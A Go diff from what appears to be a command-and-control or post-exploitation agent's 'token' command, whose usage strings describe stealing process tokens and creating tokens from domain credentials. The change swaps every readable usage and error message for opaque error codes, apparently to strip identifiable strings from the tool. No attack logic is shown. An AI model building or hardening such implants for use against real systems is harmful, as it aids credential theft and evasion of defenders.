@@ -5,7 +5,6 @@
 package main
 
 import (
-	"fmt"
 	"strconv"
 	"strings"
 	"time"
@@ -21,7 +20,7 @@ func (c *TokenCommand) Name() string {
 func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if len(args) == 0 {
 		return CommandResult{
-			Output: "Usage: token <verb> [options]",
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -70,7 +69,7 @@ func (c *TokenCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 	default:
 		return CommandResult{
-			Output:      fmt.Sprintf("Unknown verb: %s\nUse 'token help' for available commands", verb),
+			Output:      ErrCtx(E2, verb),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -87,7 +86,7 @@ func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandR
 
 	if len(args) == 0 {
 		return CommandResult{
-			Output: "Usage: token create [options]",
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -97,7 +96,7 @@ func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandR
 	if args[0] == "netonly" {
 		if len(args) < 4 {
 			return CommandResult{
-				Output:      "Usage: token create netonly <DOMAIN\\user> <password> <name>",
+				Output:      Err(E1),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}
@@ -108,7 +107,7 @@ func (c *TokenCommand) handleCreate(ctx *CommandContext, args []string) CommandR
 	// Regular token creation
 	if len(args) < 3 {
 		return CommandResult{
-			Output:      "Usage: token create <DOMAIN\\user> <password> <name> [logon_type]",
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -134,7 +133,7 @@ func (c *TokenCommand) handleSteal(ctx *CommandContext, args []string) CommandRe
 
 	if len(args) < 1 {
 		return CommandResult{
-			Output:      "Usage: token steal <pid> [name] [netonly]",
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -143,7 +142,7 @@ func (c *TokenCommand) handleSteal(ctx *CommandContext, args []string) CommandRe
 	pid, err := strconv.Atoi(args[0])
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Invalid PID: %s", args[0]),
+			Output:      ErrCtx(E2, args[0]),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -169,7 +168,7 @@ func (c *TokenCommand) handleStore(ctx *CommandContext, args []string) CommandRe
 
 	if len(args) < 2 {
 		return CommandResult{
-			Output:      "Usage: token store <pid> <name> [netonly]",
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -178,7 +177,7 @@ func (c *TokenCommand) handleStore(ctx *CommandContext, args []string) CommandRe
 	pid, err := strconv.Atoi(args[0])
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Invalid PID: %s", args[0]),
+			Output:      ErrCtx(E2, args[0]),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -201,7 +200,7 @@ func (c *TokenCommand) handleUse(ctx *CommandContext, args []string) CommandResu
 
 	if len(args) < 1 {
 		return CommandResult{
-			Output:      "Usage: token use <name> [netonly]",
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -236,7 +235,7 @@ func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) Command
 	case "set":
 		if len(args) < 2 {
 			return CommandResult{
-				Output:      "Usage: token netonly set <name>",
+				Output:      Err(E1),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}
@@ -251,7 +250,7 @@ func (c *TokenCommand) handleNetOnly(ctx *CommandContext, args []string) Command
 
 	default:
 		return CommandResult{
-			Output:      fmt.Sprintf("Unknown netonly action: %s\nUse: token netonly [set|clear|status]", action),
+			Output:      ErrCtx(E2, action),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -292,7 +291,7 @@ func (c *TokenCommand) handleRemove(ctx *CommandContext, args []string) CommandR
 
 	if len(args) < 1 {
 		return CommandResult{
-			Output:      "Usage: token remove <name>",
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
